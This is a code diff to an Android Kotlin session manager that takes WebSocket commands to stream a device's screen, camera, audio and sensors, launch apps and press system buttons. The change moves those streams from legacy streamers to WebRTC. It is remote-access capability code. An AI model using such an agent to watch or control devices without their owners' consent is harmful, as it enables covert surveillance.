@@ -30,9 +30,12 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
     private val webRtcManager = WebRtcManager(context) { sdpJsonString ->
         sendJsonString(sdpJsonString)
     }
+    
+    // WebRTC Hardware Streamers
     private val rtcScreenStreamer = WebRtcScreenStreamer(context, webRtcManager)
     private val rtcCameraStreamer = WebRtcCameraStreamer(context, webRtcManager)
     private val rtcAudioStreamer = WebRtcAudioStreamer(webRtcManager)
+    private val fileManager = LocalFileManager()
 
     private val client = OkHttpClient.Builder()
         .pingInterval(10, TimeUnit.SECONDS)
@@ -45,29 +48,32 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
     private var isStreamingSensors = false
     private var sensorManager: SensorManager? = null
 
-    private val audioStreamer = AudioStreamer { bytes -> sendBinary(bytes) } // Legacy fallback
-    private val screenStreamer = ScreenStreamer(context) { bytes -> sendBinary(bytes) } // Legacy fallback
-    private val cameraStreamer = CameraStreamer(context) { bytes -> sendBinary(bytes) } // Legacy fallback
-    private val fileManager = LocalFileManager()
-
     private val systemDataReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context?, intent: Intent?) {
+        override fun onReceive(receiverContext: Context?, intent: Intent?) {
             when (intent?.action) {
                 "com.systemlinker.SCREEN_DATA" -> {
                     intent.getStringExtra("json")?.let { webSocket?.send(it) }
                 }
                 "com.systemlinker.SCREEN_CAST_CONSENT" -> {
                     val code = intent.getIntExtra("code", 0)
-                    val data: Intent? = intent.getParcelableExtra("data")
+                    val data: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        intent.getParcelableExtra("data", Intent::class.java)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        intent.getParcelableExtra("data")
+                    }
                     
-                    scope.launch {
-                        val upgradeIntent = Intent("com.systemlinker.UPGRADE_FGS_MP")
-                        context.sendBroadcast(upgradeIntent)
-                        delay(500)
-                        
-                        // Start the hardware-accelerated WebRTC streamer
-                        rtcScreenStreamer.startStreaming(code, data!!)
-                        sendJson(JSONObject().put("status", "webrtc_screen_cast_started"))
+                    receiverContext?.let { ctx ->
+                        scope.launch {
+                            val upgradeIntent = Intent("com.systemlinker.UPGRADE_FGS_MP")
+                            ctx.sendBroadcast(upgradeIntent)
+                            delay(500)
+                            
+                            if (data != null) {
+                                rtcScreenStreamer.startStreaming(code, data)
+                                sendJson(JSONObject().put("status", "webrtc_screen_cast_started"))
+                            }
+                        }
                     }
                 }
                 "com.systemlinker.SCREEN_CAST_CONSENT_DENIED" -> {
@@ -101,21 +107,16 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
         rtcScreenStreamer.stopStreaming()
         rtcCameraStreamer.stopStreaming()
         rtcAudioStreamer.stopStreaming()
+        
         webRtcManager.peerConnection?.close()
         webRtcManager.peerConnection = null
-
-        audioStreamer.stopAll()
-        cameraStreamer.stopStreaming()
-        
-        if (screenStreamer.isStreaming) {
-            screenStreamer.stopStreaming()
-            val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
-            context.sendBroadcast(downgradeIntent)
-        }
         
         val intent = Intent("com.systemlinker.ACC_ACTION")
         intent.putExtra("action", "stream_screen_stop")
         context.sendBroadcast(intent)
+        
+        val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
+        context.sendBroadcast(downgradeIntent)
         
         try { context.unregisterReceiver(systemDataReceiver) } catch (e: Exception) {}
         
@@ -137,7 +138,7 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
     }
 
     override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
-        audioStreamer.playIncomingAudio(bytes.toByteArray())
+        // WebRTC natively handles audio over UDP. We drop WebSocket bytes.
     }
 
     override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
@@ -166,8 +167,10 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
                     webRtcManager.initialize()
                     webRtcManager.createPeerConnection(isCaller = false)
                 }
-                val signalingPayload = JSONObject(arg)
-                webRtcManager.handleSignalingMessage(signalingPayload)
+                try {
+                    val signalingPayload = JSONObject(arg)
+                    webRtcManager.handleSignalingMessage(signalingPayload)
+                } catch (e: Exception) {}
             }
             "webrtc_offer", "webrtc_answer", "webrtc_ice" -> {
                 webRtcManager.handleSignalingMessage(payload)
@@ -199,15 +202,6 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
             "vibrate" -> vibrateDevice(arg.toLongOrNull() ?: 500L)
             "launch_app" -> launchApp(arg)
             "stream_sensors" -> if (arg == "start") startSensorStream() else stopSensorStream()
-            "live_screen_res" -> {
-                val requestedRes = arg.toIntOrNull()
-                if (requestedRes != null) {
-                    screenStreamer.setResolution(requestedRes)
-                    sendJson(JSONObject().put("status", "screen_res_updated").put("resolution", "${requestedRes}p"))
-                } else {
-                    sendJson(JSONObject().put("error", "Invalid resolution value. Use 240, 360, 480, 720."))
-                }
-            }
             "btn_home", "btn_back", "btn_recents", "stream_screen_start", "stream_screen_stop" -> {
                 val intent = Intent("com.systemlinker.ACC_ACTION")
                 intent.putExtra("action", cmd)
@@ -244,7 +238,6 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
 
     private fun sendJson(json: JSONObject) { webSocket?.send(json.toString()) }
     private fun sendJsonString(jsonStr: String) { webSocket?.send(jsonStr) }
-    private fun sendBinary(bytes: ByteArray) { webSocket?.send(ByteString.of(*bytes)) }
 
     private fun vibrateDevice(durationMs: Long) {
         val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
